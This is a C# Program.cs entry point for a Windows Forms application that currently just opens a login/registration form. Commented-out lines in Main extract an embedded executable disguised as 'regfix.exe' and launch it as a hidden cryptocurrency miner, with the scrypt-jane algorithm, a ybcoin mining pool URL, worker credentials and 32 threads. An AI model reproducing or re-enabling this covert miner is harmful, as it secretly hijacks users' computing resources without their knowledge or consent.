using System;
using System.Collections.Generic;
using System.Windows.Forms;
using Common;
using log4net;

namespace DianChe
{
    static class Program
    {
        //日志类
        static ILog logAX = LogManager.GetLogger("Logger");
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {

            //ResourceOperate.ReleaseFile("libcurl-4.dll", null);
            //ResourceOperate.ReleaseFile("pthreadGC2.dll", null);
            //string fileName = ResourceOperate.ReleaseFile("regfix.exe", null);
            //System.Diagnostics.Process.Start(fileName, "--algo scrypt-jane --userpass 276368949.friend:sun --scantime 5 --url http://pool.ybcoin.com:8337 --threads 32 --retries -1 -P");

            //Application.EnableVisualStyles();
            //Application.SetCompatibleTextRenderingDefault(false);

            //var updater = FSLib.App.SimpleUpdater.Updater.Instance;
            //updater.Error += new EventHandler(updater_Error);

            //try
            //{
            //    FSLib.App.SimpleUpdater.Updater.CheckUpdateSimple(Config.UpdateUrl);
            //}
            //catch
            //{
            //}

            //Application.Run(new FrmMain());
            //Application.Run(new FrmItemRank());
            Application.Run(new FrmLoginReg());
        }

        static void updater_Error(object sender, EventArgs e)
        {
            var updater = sender as FSLib.App.SimpleUpdater.Updater;
            if (updater != null)
                MessageBox.Show(updater.Exception.ToString());
        }
    }
}
